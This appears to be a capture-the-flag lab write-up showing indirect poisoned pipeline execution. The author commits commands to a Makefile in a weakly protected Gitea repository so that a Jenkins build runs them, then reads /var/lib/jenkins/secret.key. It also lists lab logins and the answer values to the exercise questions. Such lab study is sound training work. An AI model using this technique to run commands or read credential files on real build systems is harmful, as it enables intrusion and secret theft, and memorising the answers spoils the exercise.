# Day_21 [DevSecOps] Yule be Poisoned: A Pipeline of Insecure Code!

+ Deployable Machine: Yes

Description: One of the main reasons for acquiring AntarctiCrafts was for their crafty automation in gift-giving, wrapping, and crafting. After securing their automation, they discovered other parts of their CI/CD environment that are used to build and extend their pipeline. An attacker can abuse these build systems to indirectly poison the previously secured pipeline.

> IP: [10.10.254.216]

## LEARNING OBJECTIVES

1. Understand how a larger CI/CD environment operates.
2. Explore indirect poisoned pipeline execution (PPE) and how it can be used to exploit Git.
3. Apply CI/CD exploitation knowledge to the larger CI/CD environment.

## OVERVIEW

1. Indirect Poisoned Pipeline Execution
   1. Let's briefly shift our focus back to the development stage. In the previous task, poisoned pipeline execution was introduced, wherein an attacker has direct write access to a repository pipeline. If an attacker doesn't have direct write access (to a main-protected or branch-protected repository, for example), it's possible they have write access to other repositories that could indirectly modify the behaviour of the pipeline execution. 

## STEPS

1. Deploy Machine
2. Navigate to website
   1. Gitea: [http://10.10.254.216:3000]
      1. UN: guest
      2. PW: password123
      3. In here we see two repos
         1. gift-wrapper
         2. gift-wrapper-pipeline
   2. Jenkins: [http://10.10.254.216:8080]
      1. UN: admin
      2. PW: admin
      3. In here we see one project
         1. gift-wrapper-build
3. GIFT-WRAPPER-PIPELINE
   1. Lookin into the pipeline repository we see a jenkins file

      ```jenkinsfile
         stages {
            stage('Do nothing') {
            stage('Prepare') {
               steps {
                     sh 'whoami'
                     git 'http://127.0.0.1:3000/McHoneyBell/gift-wrapper.git'
               }
            }

            stage('Build') {
               steps {
                     sh 'make || true'
               }
            }
         }
      ```

      1. In the changes colors we see that stage('Do nothing') was changed to stage('Prepare') and steps{ sh 'whoami' } was changed to steps{ git 'http://127.0.0.1:3000/McHoneyBell/gift-wrapper.git' }
4. CLONE GIFT-WRAPPER-PIPELINE
   1. Lets clone the repository so we can make some changes
      1. > git clone 'http://10.10.254.216:3000/McHoneyBell/gift-wrapper-pipeline.git'
   2. Now lets make a change
      1. Change line 13 of jenkinsfile 
         1. sh 'make || true' to sh 'whoami'
   3. Commit and push changes
      1. > git add .
      2. > git commit -m "Added whoami"
      3. > git push
         1. RESPONSE: Username for 'http://10.10.254.216:3000':
            1. This tells us that these repos are main-protected and branch-protected
            2. So we need a different method
5. MAKEFILE
   1. Looking at the jenkinsfile we see it uses a makefile which means it runs commands specified.
   2. However, the makefile is held in the gift-wrapper repository which means it might have different protections than the pipeline
6. CLONE GIFT-WRAPPER
   1. Lets clone the other repository
      1. > git clone http://10.10.254.216:3000/McHoneyBell/gift-wrapper.git
   2. Now lets make some changes
      1. In the Makefile remove the "to_pip.sh" script and add "whoami"
   3. Commit and push
      1. > git add .
      2. > git commit -m "whoami"
      3. > git push
      4. SUCCESS!
7. JENKINS
   1. Now go back to jenkins and navigate to "gift-wrapper-build" -> "gift-wrapper-pipeline" -> "main" -> "console output"
   2. In here we see
      1. > whoami
      2. jenkins
         1. SUCCESS!! We have poisnoned the pipeline and now we know we can run commands
8. EXPLOIT
   1. Linux Version
      1. In the makefile lets add the command
         1. > uname -r
   2. Secret.key
      1. In the make file lets add the command
         1. > cat /var/lib/jenkins/secret.key
   3. COMMIT
      1. Commit our changes
   4. JENKINS
      1. Now go back to the jenkins build and look for our command outputs
      2. OUTPUT
         1. VERSION = `5.4.0-1029-aws`
         2. KEY = `90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7`

## QUESTIONS

1. What Linux kernel version is the Jenkins node?
   1. `5.4.0-1029-aws`
2. What value is found from /var/lib/jenkins/secret.key?
   1. `90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7`